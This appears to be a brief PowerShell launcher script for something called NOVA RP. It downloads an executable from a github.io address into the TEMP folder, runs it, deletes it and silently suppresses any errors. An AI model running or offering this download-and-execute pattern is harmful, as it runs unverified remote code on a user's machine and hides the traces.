$URL = "https://gytox.github.io/NOVA_RP/NOVA_RP_Launcher.exe"
$TempPath = "$env:TEMP\NOVA_RP_Launcher.exe"

try {
    Invoke-WebRequest -Uri $URL -OutFile $TempPath -UseBasicParsing -ErrorAction Stop
    Start-Process $TempPath -Wait -ErrorAction Stop
    Remove-Item "$env:TEMP\NOVA_RP_Launcher.exe" -Force -ErrorAction SilentlyContinue
} catch {}